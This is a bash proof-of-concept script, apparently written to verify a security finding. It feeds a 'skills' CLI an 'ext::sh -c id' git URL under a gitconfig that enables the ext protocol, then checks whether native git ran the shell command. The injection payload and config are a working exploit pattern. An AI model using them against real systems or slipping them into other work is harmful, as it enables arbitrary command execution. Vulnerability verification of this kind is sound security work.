#!/usr/bin/env bash
set -u -o pipefail

FINDING_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$FINDING_DIR/../../.." && pwd)"
EVIDENCE_DIR="$FINDING_DIR/evidence"
mkdir -p "$EVIDENCE_DIR"

IMPACT="$EVIDENCE_DIR/impact.log"
CLI_LOG="$EVIDENCE_DIR/cli-output.log"
rm -f "$IMPACT" "$CLI_LOG"

if [[ ! -f "$REPO_ROOT/bin/cli.mjs" ]]; then
  echo "[-] skills CLI not found at $REPO_ROOT/bin/cli.mjs"
  printf '{"status": "failed", "evidence": "skills CLI binary missing", "notes": "expected bin/cli.mjs under repository root"}\n'
  exit 0
fi

POC_HOME="$(mktemp -d "${TMPDIR:-/tmp}/skills-poc-home.XXXXXX")"
POC_WORK="$(mktemp -d "${TMPDIR:-/tmp}/skills-poc-work.XXXXXX")"
trap 'rm -rf "$POC_HOME" "$POC_WORK"' EXIT
mkdir -p "$POC_HOME/.config"
cat > "$POC_HOME/.gitconfig" <<'GITCFG'
[protocol "ext"]
    allow = always
GITCFG

PAYLOAD="ext::sh -c id% >$IMPACT% 2>&1"

echo "[*] Running real skills CLI against direct git URL payload"
echo "[*] Isolated HOME contains protocol.ext.allow=always; output marker: evidence/impact.log"
(
  cd "$POC_WORK" || exit 1
  HOME="$POC_HOME" \
  XDG_CONFIG_HOME="$POC_HOME/.config" \
  GIT_CONFIG_NOSYSTEM=1 \
  SKILLS_CLONE_TIMEOUT_MS=15000 \
  NO_COLOR=1 \
  node "$REPO_ROOT/bin/cli.mjs" add "$PAYLOAD" -y
) > "$CLI_LOG" 2>&1
CLI_RC=$?

echo "[*] skills CLI exit code: $CLI_RC"
echo "[*] CLI log saved to evidence/cli-output.log"

if [[ -s "$IMPACT" ]] && grep -q '^uid=' "$IMPACT"; then
  echo "[+] Native git ext helper executed; impact marker: $(head -n 1 "$IMPACT")"
  printf '{"status": "confirmed", "evidence": "git ext helper wrote process identity to evidence/impact.log", "notes": "real skills CLI accepted a direct ext:: git source and native git executed sh -c before clone failure"}\n'
else
  echo "[-] No process identity was written to evidence/impact.log"
  printf '{"status": "failed", "evidence": "no impact marker written", "notes": "CLI exit code %s; see evidence/cli-output.log"}\n' "$CLI_RC"
fi
